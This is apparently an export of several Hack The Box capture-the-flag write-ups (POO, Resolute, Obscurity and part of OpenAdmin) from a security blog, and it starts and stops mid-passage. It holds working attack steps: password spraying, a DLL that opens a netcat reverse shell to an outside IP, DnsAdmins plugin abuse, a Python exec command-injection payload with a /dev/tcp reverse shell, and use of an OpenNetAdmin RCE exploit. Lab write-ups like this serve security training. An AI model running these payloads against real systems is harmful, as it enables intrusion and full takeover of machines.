         : 7d359419-cb48-4d54-b1fd-f2eabf8ae94dlastlogon             : 1/1/1601 2:00:00 AMlastlogoff            : 1/1/1601 2:00:00 AMobjectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata : 1/1/1601 12:00:00 AMserviceprincipalname  : HR_peoplesoft/intranet.poo:1433whencreated           : 3/21/2018 7:06:32 PMbadpwdcount           : 0cn                    : p00_hruseraccountcontrol    : NORMAL_ACCOUNTusncreated            : 25712primarygroupid        : 513pwdlastset            : 3/21/2018 9:06:32 PMusnchanged            : 25727NULLlogoncount            : 19badpasswordtime       : 4/11/2018 10:58:02 PMdistinguishedname     : CN=p00_dev,CN=Users,DC=intranet,DC=pooobjectclass           : {top, person, organizationalPerson, user}lastlogontimestamp    : 3/21/2018 9:15:25 PMname                  : p00_devobjectsid             : S-1-5-21-2413924783-1155145064-2969042445-1106samaccountname        : p00_devcodepage              : 0samaccounttype        : USER_OBJECTaccountexpires        : 1/1/1601 2:00:00 AMcountrycode           : 0whenchanged           : 3/21/2018 7:15:25 PMinstancetype          : 4usncreated            : 25717objectguid            : f221260f-558d-4787-b867-ec03a01cfa2elastlogoff            : 1/1/1601 2:00:00 AMobjectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata : 1/1/1601 12:00:00 AMlastlogon             : 3/22/2018 7:51:35 PMbadpwdcount           : 3cn                    : p00_devuseraccountcontrol    : NORMAL_ACCOUNTwhencreated           : 3/21/2018 7:06:49 PMprimarygroupid        : 513pwdlastset            : 3/21/2018 9:06:49 PMusnchanged            : 25736NULLlogoncount            : 13badpasswordtime       : 3/22/2018 1:53:22 PMdistinguishedname     : CN=p00_adm,CN=Users,DC=intranet,DC=pooobjectclass           : {top, person, organizationalPerson, user}lastlogontimestamp    : 4/11/2018 8:59:32 PMname                  : p00_admobjectsid             : S-1-5-21-2413924783-1155145064-2969042445-1107samaccountname        : p00_admcodepage              : 0samaccounttype        : USER_OBJECTaccountexpires        : 1/1/1601 2:00:00 AMcountrycode           : 0whenchanged           : 4/11/2018 5:59:32 PMinstancetype          : 4objectguid            : 3a04555f-c783-4b22-afeb-28ac72154842lastlogon             : 4/12/2018 12:45:33 AMlastlogoff            : 1/1/1601 2:00:00 AMobjectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poodscorepropagationdata : 1/1/1601 12:00:00 AMserviceprincipalname  : cyber_audit/intranet.poo:443memberof              : CN=P00 Help Desk,CN=Users,DC=intranet,DC=poowhencreated           : 3/21/2018 7:07:23 PMbadpwdcount           : 0cn                    : p00_admuseraccountcontrol    : NORMAL_ACCOUNTusncreated            : 25722primarygroupid        : 513pwdlastset            : 3/22/2018 2:39:53 PMusnchanged            : 69768We can copy the BloodHound files to our local computer using WinRM:PS C:\\Users\\snowscan&gt; $session = new-pssession -computername [dead:babe::1001] -credential $CredentialPS C:\\Users\\snowscan&gt; copy-item -fromsession $session -path c:\\temp\\*.csv -destination .PS C:\\Users\\snowscan&gt;Now, let’s load all these files in Bloodhound…Wow, p00_adm has GenericAll access to all lot of groups, including Domain Admins!https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/  TL;DR: if we control an object that has SeEnableDelegationPrivilege in the domain, AND said object has GenericAll/GenericWrite rights over any other user object in the domain, we can compromise the domain at will, indefinitely.We’ll try using MSSQL again and run commands p00_adm and see if we can escalate to Domain Admin.xp_cmdshell 'powershell -c \"import-module c:\\temp\\p.ps1; $SecPassword = ConvertTo-SecureString \\\"ZQ!5t4r\\\" -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential(\\\"intranet.poo\\p00_adm\\\", $SecPassword); Add-DomainGroupMember -Identity \\\"Domain Admins\\\" -Members \\\"p00_adm\\\" -Credential $Cred \"'Command has executed successfully, let’s log in:PS C:\\Users\\snowscan&gt; $SecPassword = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -ForcePS C:\\Users\\snowscan&gt; $Credential = New-Object System.Management.Automation.PSCredential('intranet.poo\\p00_adm', $SecPassword)PS C:\\Users\\snowscan&gt; enter-pssession -computername [dead:babe::1001] -credential $Credential[[dead:babe::1001]]: PS C:\\Users\\p00_adm\\Documents&gt; whoamipoo\\p00_admOk, we are now logged in as p00_adm, we can run commands on the DC by using invoke-command:[[dead:babe::1001]]: PS C:\\Users\\p00_adm\\Documents&gt; invoke-command -credential $credential -computername dc -scriptblock { dir c:\\users}    Directory: C:\\usersMode                LastWriteTime         Length Name                                PSComputerName----                -------------         ------ ----                                --------------d-----        3/15/2018   1:20 AM                Administrator                       dcd-----        3/15/2018  12:38 AM                mr3ks                               dcd-----        4/12/2018   4:37 AM                p00_adm                             dcd-r---       11/21/2016   3:24 AM                Public                              dc[[dead:babe::1001]]: PS C:\\Users\\p00_adm\\Documents&gt; invoke-command -credential $credential -computername dc -scriptblock { dir c:\\users\\mr3ks}    Directory: C:\\users\\mr3ksMode                LastWriteTime         Length Name                                PSComputerName----                -------------         ------ ----                                --------------d-r---        3/22/2018  11:17 PM                Contacts                            dcd-r---         4/7/2018   1:06 PM                Desktop                             dcd-r---        3/22/2018  11:17 PM                Documents                           dcd-r---         4/7/2018  12:51 PM                Downloads                           dcd-r---        3/22/2018  11:17 PM                Favorites                           dcd-r---        3/22/2018  11:17 PM                Links                               dcd-r---        3/22/2018  11:17 PM                Music                               dcd-r---        3/22/2018  11:17 PM                Pictures                            dcd-r---        3/22/2018  11:17 PM                Saved Games                         dcd-r---        3/22/2018  11:17 PM                Searches                            dcd-r---        3/22/2018  11:17 PM                Videos                              dc[[dead:babe::1001]]: PS C:\\Users\\p00_adm\\Documents&gt; invoke-command -credential $credential -computername dc -scriptblock { dir c:\\users\\mr3ks\\desktop}    Directory: C:\\users\\mr3ks\\desktopMode                LastWriteTime         Length Name                                PSComputerName----                -------------         ------ ----                                ---------------a----        3/26/2018   5:47 PM             37 flag.txt                            dc[[dead:babe::1001]]: PS C:\\Users\\p00_adm\\Documents&gt; invoke-command -credential $credential -computername dc -scriptblock { type c:\\users\\mr3ks\\desktop\\flag.txt}POO{1196ef8bc523f0...}Jackpot! We got the last flag: POO{1196ef8bc523f0...}"
  },
  
  {
    "title": "Resolute - Hack The Box",
    "url": "/posts/htb-writeup-resolute/",
    "categories": "hackthebox, infosec",
    "tags": "rid cycling, password spray, creds in plaintext, bloodhound, dns",
    "date": "2020-05-30 00:00:00 +0800",
    





    
    "snippet": "We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Passwo...",
    "content": "We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Password spraying the password against all the discovered accounts give us an initial shell then we pivot to another user after finding creds in a console history file. The priv esc is pretty cool: we’re in the DNS admins group so we can reconfigure the DNS service to run an arbitrary DLL as SYSTEM.Summary  We can enumerate the AD users using LDAP or RID cycling with enum4linux  There’s a default credential in one of the LDAP field for a user  By password spraying this password across all discovered user accounts, we gain access as user melanie  The credentials for the ryan user are found in the powershell history file  User ryan is part of the DNS Admins group and we can replace the DNS service with a dll of our choosing  By controlling the dll, we have RCE as SYSTEM since the DNS service runs as SYSTEMTools/Blogs used  windapsearch  BloodHound.py  From DnsAdmins to SYSTEM to Domain CompromiseFails  Tried to create and modify DNS records once I had access to user Ryan, thinking it was a similar priv esc path than another lab on HTB  Not keeping a “ready-to-go” DLL file handy. I had one on my previous Kali VM but didn’t copy it over so I wasted precious time building a new one.Recon - Portscanroot@beholder:~/htb/resolute# nmap -p- 10.10.10.169Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 14:03 ESTNmap scan report for resolute.htb (10.10.10.169)Host is up (0.025s latency).Not shown: 65512 closed portsPORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5985/tcp  open  wsman9389/tcp  open  adws47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49667/tcp open  unknown49671/tcp open  unknown49676/tcp open  unknown49677/tcp open  unknown49688/tcp open  unknown49776/tcp open  unknownRecon - Enumerating usersAnonymous bind is allowed on the DC so I can use windapsearch to quickly get a list of all users on the system. This tool saves me the trouble of remembering the exact ldapsearch syntax (which I forget every single time).root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 -U[+] No username provided. Will try anonymous bind.[+] Using Domain Controller at: 10.10.10.169[+] Getting defaultNamingContext from Root DSE[+]\tFound: DC=megabank,DC=local[+] Attempting bind[+]\t...success! Binded as: [+]\t None[+] Enumerating all AD users[+]\tFound 25 users: cn: Guestcn: DefaultAccountcn: Ryan BertranduserPrincipalName: ryan@megabank.localcn: Marko NovakuserPrincipalName: marko@megabank.localcn: Sunita RahmanuserPrincipalName: sunita@megabank.localcn: Abigail JeffersuserPrincipalName: abigail@megabank.localcn: Marcus StronguserPrincipalName: marcus@megabank.localcn: Sally MayuserPrincipalName: sally@megabank.localcn: Fred CarruserPrincipalName: fred@megabank.localcn: Angela PerkinsuserPrincipalName: angela@megabank.localcn: Felicia CarteruserPrincipalName: felicia@megabank.localcn: Gustavo PallierosuserPrincipalName: gustavo@megabank.localcn: Ulf BerguserPrincipalName: ulf@megabank.localcn: Stevie GerrarduserPrincipalName: stevie@megabank.localcn: Claire NormanuserPrincipalName: claire@megabank.localcn: Paulo AlcobiauserPrincipalName: paulo@megabank.localcn: Steve RideruserPrincipalName: steve@megabank.localcn: Annette NilssonuserPrincipalName: annette@megabank.localcn: Annika LarsonuserPrincipalName: annika@megabank.localcn: Per OlssonuserPrincipalName: per@megabank.localcn: Claude SegaluserPrincipalName: claude@megabank.localcn: Melanie PurkisuserPrincipalName: melanie@megabank.localcn: Zach ArmstronguserPrincipalName: zach@megabank.localcn: Simon FaradayuserPrincipalName: simon@megabank.localcn: Naoki YamamotouserPrincipalName: naoki@megabank.local[*] Bye!I did another search in the LDAP directory but this time looking at the description because sometimes we can find additonial useful information in there. Here I see that the marko user has a note about the password being set to Welcome123!root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 --attrs sAMAccountName,description -U[+] No username provided. Will try anonymous bind.[+] Using Domain Controller at: 10.10.10.169[+] Getting defaultNamingContext from Root DSE[+]\tFound: DC=megabank,DC=local[+] Attempting bind[+]\t...success! Binded as: [+]\t None[+] Enumerating all AD users[+]\tFound 25 users: [...]description: Account created. Password set to Welcome123!sAMAccountName: marko[...]Password spraying - Access to user MelanieThe credentials marko / Welcome123! don’t work with either SMB or WinRM:root@beholder:~# evil-winrm -u marko -p Welcome123! -i 10.10.10.169Evil-WinRM shell v2.0Info: Establishing connection to remote endpointError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationErrorroot@beholder:~# smbmap -u marko -p Welcome123! -H 10.10.10.169[+] Finding open SMB ports....[!] Authentication error on 10.10.10.169The password could be used by another account on the system so I’ll use crackmapexec to try that password across all the accounts. I’ll save my list of users to users.txt and use it with CME.root@beholder:~/htb/resolute# crackmapexec smb 10.10.10.169 -u users.txt -p Welcome123!SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)[...]SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\\melanie:Welcome123!Bingo, we got the password for Melanie’s account.root@beholder:~/htb/resolute# evil-winrm -u melanie -p Welcome123! -i 10.10.10.169Evil-WinRM shell v2.0Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt; type ..\\desktop\\user.txt0c3be45f[...]Powershell transcripts - Getting access as user ryanLooking around the filesystem, I found the Powershell transcripts in the C:\\pstranscripts\\20191203 directory. They contain a net use command that ryan used to mount a remote file share. Unfortunately for him, he specified the credentials in the command so I can see them in plaintext in the transcript file: ryan / Serv3r4Admin4cc123!*Evil-WinRM* PS C:\\pstranscripts\\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt**********************Windows PowerShell transcript startStart time: 20191203063201Username: MEGABANK\\ryanRunAs User: MEGABANK\\ryan[...]**********************Command start time: 20191203063515**********************PS&gt;CommandInvocation(Invoke-Expression): \"Invoke-Expression\"&gt;&gt; ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123!After getting access to the ryan user account, I found a note in his desktop folder talking about changes automatically being reverted.root@beholder:~/htb/resolute# evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169Evil-WinRM shell v2.0Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; dir ../desktop    Directory: C:\\Users\\ryan\\desktopMode                LastWriteTime         Length Name----                -------------         ------ -----ar---        12/3/2019   7:34 AM            155 note.txt*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; type ../desktop/note.txtEmail to team:- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minutePrivesc using the DNS serviceOur ryan user is part of the Contractors domain group.*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; net user ryanUser name                    ryanFull Name                    Ryan Bertrand[...]Local Group Memberships      Global Group memberships     *Domain Users         *Contractors          The command completed successfully.I used the python BloodHound ingestor to dump the info in BloodHound and see if I could pick up anything interesting to exploit.root@beholder:~/opt/BloodHound.py# ./bloodhound.py -c all -u ryan -p Serv3r4Admin4cc123! --dns-tcp -d megabank.local -dc megabank.local -gc megabank.local -ns 10.10.10.169INFO: Found AD domain: megabank.localINFO: Connecting to LDAP server: megabank.localINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Connecting to LDAP server: megabank.localINFO: Found 27 usersINFO: Found 50 groupsINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: MS02.megabank.localINFO: Querying computer: Resolute.megabank.localINFO: Done in 00M 03SAs I suspected, user ryan is a member of two additional groups: Remote Management Users and DnsAdmin. I remember reading about a potential privilege escalation vector for users with DnsAdmin group access.Spotless has a great blog post that covers this priv esc. In a nutshell, we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. Because we’re in the DnsAdmins group, we can re-configure the service and we have the required privileges to restart it.Here’s a quick DLL file that just calls netcat to get a reverse shell.#include \"stdafx.h\"#include &lt;stdlib.h&gt;BOOL APIENTRY DllMain(HMODULE hModule,\tDWORD  ul_reason_for_call,\tLPVOID lpReserved){\tswitch (ul_reason_for_call)\t{\tcase DLL_PROCESS_ATTACH:\t\tsystem(\"c:\\\\windows\\\\system32\\\\spool\\\\drivers\\\\color\\\\nc.exe -e cmd.exe 10.10.14.51 5555\");\tcase DLL_THREAD_ATTACH:\tcase DLL_THREAD_DETACH:\tcase DLL_PROCESS_DETACH:\t\tbreak;\t}\treturn TRUE;}After compiling this, I upload both the DLL and netcat to the machine.*Evil-WinRM* PS C:\\windows\\system32\\spool\\drivers\\color&gt; upload /root/htb/resolute/nc.exeInfo: Uploading /root/htb/resolute/nc.exe to C:\\windows\\system32\\spool\\drivers\\color\\nc.exeData: 53248 bytes of 53248 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\windows\\system32\\spool\\drivers\\color&gt; upload /root/htb/resolute/pwn.dllInfo: Uploading /root/htb/resolute/pwn.dll to C:\\windows\\system32\\spool\\drivers\\color\\pwn.dllData: 305604 bytes of 305604 bytes copiedInfo: Upload successful!Next, I’ll reconfigure the dns service and restart it.*Evil-WinRM* PS C:\\windows\\system32\\spool\\drivers\\color&gt; cmd /c 'dnscmd RESOLUTE /config /serverlevelplugindll C:\\Windows\\System32\\spool\\drivers\\color\\pwn.dll'Registry property serverlevelplugindll successfully reset.Command completed successfully.*Evil-WinRM* PS C:\\windows\\system32\\spool\\drivers\\color&gt; cmd /c \"sc stop dns\"SERVICE_NAME: dns         TYPE               : 10  WIN32_OWN_PROCESS          STATE              : 3  STOP_PENDING                                 (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0*Evil-WinRM* PS C:\\windows\\system32\\spool\\drivers\\color&gt; cmd /c \"sc start dns\"SERVICE_NAME: dns         TYPE               : 10  WIN32_OWN_PROCESS          STATE              : 2  START_PENDING                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x7d0        PID                : 3500        FLAGSThis triggers the DLL and I get a reverse shell as SYSTEM:root@beholder:~/htb/resolute# rlwrap nc -lvnp 5555Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Listening on :::5555Ncat: Listening on 0.0.0.0:5555Ncat: Connection from 10.10.10.169.Ncat: Connection from 10.10.10.169:56778.Microsoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamint authority\\systemC:\\Windows\\system32&gt;type c:\\users\\administrator\\desktop\\root.txte1d9487[...]"
  },
  
  {
    "title": "Obscurity - Hack The Box",
    "url": "/posts/htb-writeup-obscurity/",
    "categories": "hackthebox, infosec",
    "tags": "custom webserver, command injection, race condition",
    "date": "2020-05-09 00:00:00 +0800",
    





    
    "snippet": "The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-dat...",
    "content": "The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-data. Then we have to solve a simple crypto challenge to retrieve an encryption key that decrypts a file containing the robert user’s password. We finally get root by exploiting a race condition in a python script so that we can copy the /etc/shadow file and crack the root password.Summary  Find the secret directory on the webserver that holds the source code for the web application  Exploit a command injection vulnerability in the application and get a shell as www-data  Recover the key for some homemade crypto cipher and recover the password for user robert  Exploit a race condition in yet another python program so I can read the shadow file and crack the root passwordReconI see there’s a custom webserver when I run my nmap scan: BadHTTPServerroot@beholder:~# nmap -sC -sV -p- 10.10.10.168Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-30 15:25 ESTNmap scan report for obscurity.htb (10.10.10.168)Host is up (0.025s latency).Not shown: 65531 filtered portsPORT     STATE  SERVICE22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)80/tcp   closed http8080/tcp open  http-proxy BadHTTPServer| fingerprint-strings: |   GetRequest, HTTPOptions: |     HTTP/1.1 200 OK|     Date: Sat, 30 Nov 2019 20:29:55|     Server: BadHTTPServer|     Last-Modified: Sat, 30 Nov 2019 20:29:55|     Content-Length: 4171|     Content-Type: text/html|     Connection: Closed|     &lt;!DOCTYPE html&gt;[...]9000/tcp closed cslistenerNmap done: 1 IP address (1 host up) scanned in 88.39 secondsWebsiteSo this company is taking a unique approach based on security by obscurity, what could go wrong? It’s pretty clear I’m gonna have to exploit a custom webserver here based on the notes from the webpage. It also says they’re working on a new encryption algorithm and a replacement for SSH. I’m sure the folks from Crown Sterling would be interested in this crypto vaporware garbage!Looks like these guys haven’t discovered email yet and they use their public website to message their developpers instead. I’m now going to be looking for that directory that holds the SuperSecureServer.py file next.Fuzzing the webserver to find the source codeI’m going to fuzz the directories to try to find the location of that file with the python source.The server source code is located here: http://10.10.10.168:8080/develop/SuperSecureServer.pyExploiting the command injection vulnerability in the source codeA quick source code review shows that an exec() call is made here: def serveDoc(self, path, docRoot):        path = urllib.parse.unquote(path)        try:            info = \"output = 'Document: {}'\" # Keep the output for later debug            exec(info.format(path)) # This is how you do string formatting, right?            cwd = os.path.dirname(os.path.realpath(__file__))            docRoot = os.path.join(cwd, docRoot)            if path == \"/\":                path = \"/index.html\"            requested = os.path.join(docRoot, path[1:])The exec function is just like an eval, it’ll execute whatever python code has been passed to it. Here’s documentation snippet:exec(source, globals=None, locals=None, /)    Execute the given source in the context of globals and locals.        The source may be a string representing one or more Python statements    or a code object as returned by compile().    The globals must be a dictionary and locals can be any mapping,    defaulting to the current globals and locals.    If only globals is given, locals defaults to it.So what the program does here is take the path in the GET request, formats it and stores the result in the output variable. Here’s what happen if I test that part of the code manually in the python interactive interpreter.&gt;&gt;&gt; exec(\"output = 'Document: {}'\".format(\"/test\"))&gt;&gt;&gt; output'Document: /test'That output variable is not even used in the program and has been placed here just to introduce that command injection vulnerability. What I can do here is store an empty value in the output variable but add additional code after the output variable assignment.I’ll test this locally first in my python shell, first I’ll validate that I can execute whoami:&gt;&gt;&gt; exec(\"output = 'Document: {}'\".format(\"';__import__(\\\"os\\\").system(\\\"whoami\\\")#'\"))rootOk so that works. Next I’ll spawn a reverse shell with:&gt;&gt;&gt; exec(\"output = 'Document: {}'\".format(\"';__import__(\\\"os\\\").system(\\\"bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1'\\\")#'\"))root@beholder:~# nc -lvnp 4444listening on [any] 4444 ...connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38520Awesome, next destination: getting a shell on the target box.I’ll use the ';__import__(\"os\").system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'\")# payload and URL-encode all the characters so I don’t have any problems with my curl command. The exec/eval works and I get a shell.Cracking robert’s passwordI have access to robert’s home directory but I can’t read the flag so I have to get access to his account next.The check.txt file is the plaintext, and out.txt is the ciphertext:www-data@obscure:/home/robert$ cat check.txtEncrypting this file with your key should result in out.txt, make sure your key is correct!www-data@obscure:/home/robert$ xxd out.txtxxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........vWhat I really want to read is the passwordreminder.txt but it’s also encrypted:www-data@obscure:/home/robert$ xxd passwordreminder.txtxxd passwordreminder.txt00000000: c2b4 c391 c388 c38c c389 c3a0 c399 c381  ................00000010: c391 c3a9 c2af c2b7 c2bf 6b              ..........kHere I’ll assume that the key used to encrypt check.txt is the same as passwordreminder.txt otherwise I won’t be able to do much.The SuperSecureCrypt.py program uses addition and modulo to encrypt/decrypt the files:[...]def encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = \"\"    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypteddef decrypt(text, key):    keylen = len(key)    keyPos = 0    decrypted = \"\"    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr - ord(keyChr)) % 255)        decrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return decrypted[...]The encryption works a bit like XOR where if you have the plaintext and ciphertext you can recover the key by XORing the two together. To recover the key here, I’ll take the out.xt ciphertext text and decrypt it with the plaintext and this’ll write the key into my x.txt output file.$ python3 ./SuperSecureCrypt.py -d -i out.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -o x.txt#################################           BEGINNING          ##    SUPER SECURE ENCRYPTOR    #################################  ############################  #        FILE MODE         #  ############################Opening file out.txt...Decrypting...Writing to x.txt...$ cat x.txtalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichI’ll use alexandrovich as the decryption key for passwordreminder.txt to recover the SSH password for user robert: SecThruObsFTW$ python3 ./SuperSecureCrypt.py -d -i passwordreminder.txt -o x.txt -k 'alexandrovich'#################################           BEGINNING          ##    SUPER SECURE ENCRYPTOR    #################################  ############################  #        FILE MODE         #  ############################Opening file passwordreminder.txt...Decrypting...Writing to x.txt...$ cat x.txtSecThruObsFTWPrivescThe privesc is pretty obvious, there’s a python script running as root and we need to exploit it. As stated on their website, this is their own proprietary SSH program.robert@obscure:~$ sudo -lMatching Defaults entries for robert on obscure:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser robert may run the following commands on obscure:    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.pyIn short, there’s a race condition in the program where it copies the contents of /etc/shadow to a temporary location then deletes the file. The sleep command introduces a delay we can exploit.[...]    with open('/etc/shadow', 'r') as f:        data = f.readlines()    data = [(p.split(\":\") if \"$\" in p else None) for p in data]    passwords = []    for x in data:        if not x == None:            passwords.append(x)    passwordFile = '\\n'.join(['\\n'.join(p) for p in passwords])     with open('/tmp/SSH/'+path, 'w') as f:        f.write(passwordFile)    time.sleep(.1)[...]The copied shadow file is stored in /tmp/SSH/ for a few milliseconds so it’s possible to read it by running a bash loop to copy it outside of the /tmp/SSH directory before it is deleted:Time to crack that hash!Password is mercedes. We can now su root:"
  },
  
  {
    "title": "OpenAdmin - Hack The Box",
    "url": "/posts/htb-writeup-openadmin/",
    "categories": "hackthebox, infosec",
    "tags": "opennetadmin, unintended, db creds, gtfobins",
    "date": "2020-05-02 00:00:00 +0800",
    





    
    "snippet": "OpenAdmin is an easy box that starts with using an exploit for the OpenNetAdmin software to get initial RCE. Then we get credentials from the database config and can re-use them to connect by SSH. ...",
    "content": "OpenAdmin is an easy box that starts with using an exploit for the OpenNetAdmin software to get initial RCE. Then we get credentials from the database config and can re-use them to connect by SSH. We then find another web application with an hardcoded SHA512 hash in the PHP code for the login page. After cracking it we’re able to log in and obtain an encrypted SSH key that we have to crack. After getting one more shell, we can run nano as root with sudo and spawn a shell as root.Summary  Find the OpenNetAdmin page and use a remote code execution exploit to get access to user www-data  The DB credentials from the OpenNetAdmin configuration file are re-used for SSH access as user jimmy  Find another internal website running and get a SHA512 hash from the PHP code  After cracking the hash, log into the application and find an encrypted SSH private key  Crack the key and then log in a user joanna and get the first flag  Look at the sudo commands and find that nano can be run as root, look up gtfobins and spawn /bin/bash from nanoroot@kali:~/htb/openadmin# nmap -p- 10.10.10.171Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 14:41 ESTNmap scan report for openadmin.htb (10.10.10.171)Host is up (0.016s latency).Not shown: 65533 closed portsPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 10.22 secondsWeb enumerationThe default Ubuntu page is shown when I check out the webserver’s root directory.Let’s run gobuster to find hidden files and directories:# gobuster dir -t 50 -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x php -u http://openadmin.htb[...]/artwork (Status: 301)/music (Status: 301)/server-status (Status: 403)/sierra (Status: 301)So I found a couple of static web pages for the three directories above:OpenNetAdmin RCEThe /music page’s login link goes to http://openadmin.htb/ona/ which is running OpenNetAdmin, a system for tracking IP network attributes in a database.I see it’s running v18.1.1 and a quick search on exploit-db shows I can get RCE by exploiting a bug in the application.OpenNetAdmin 18.1.1 - Remote Code Execution     | exploits/php/webapps/47691.shAfter executing the exploit I have RCE as user www-data.root@kali:~/htb/openadmin# ./exploit.sh http://openadmin.htb/ona/$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)Unintended path to root flagWhile looking around the filesystem I found a hash in priv.save which turned out to be the root flag.$ ls -l /opttotal 12drwxr-x--- 7 www-data www-data 4096 Nov 21 18:23 ona-rw-r--r-- 1 root     root        0 Nov 22 23:49 priv-rw-r--r-- 1 root     root       33 Jan  2 20:54 priv.save-rw-r--r-- 1 root     root       33 Jan  2 21:12 priv.save.1$ cat /opt/priv.save2f907ed450b[...]Escalating to user jimmyI see there’s two additonal users which I don’t have access to right now.$ ls -l /hometotal 8drwxr-x--- 5 jimmy  jimmy  4096 Nov 22 23:15 jimmydrwxr-x--- 6 joanna joanna 4096 Nov 28 09:37 joanna$ lslogins  UID USER            PROC PWD-LOCK PWD-DENY  LAST-LOGIN GECOS[...] 1000 jimmy              0                   Jan02/20:50 jimmy 1001 joanna             0                   Jan02/21:12 ,,,The OpenNetAdmin database credentials are shown in the /database_settings.inc.php file.$ cat /opt/ona/www/local/config/database_settings.inc.php&lt;?php$ona_contexts=array (  'DEFAULT' =&gt;   array (    'databases' =&gt;     array (      0 =&gt;       array (        'db_type' =&gt; 'mysqli',        'db_host' =&gt; 'localhost',        'db_login' =&gt; 'ona_sys',        'db_passwd' =&gt; 'n1nj4W4rri0R!',        'db_database' =&gt; 'ona_default',        'db_debug' =&gt; false,      ),    ),    'description' =&gt; 'Default data context',    'context_color' =&gt; '#D3DBFF',  ),);The n1nj4W4rri0R! password works with user jimmy to get an 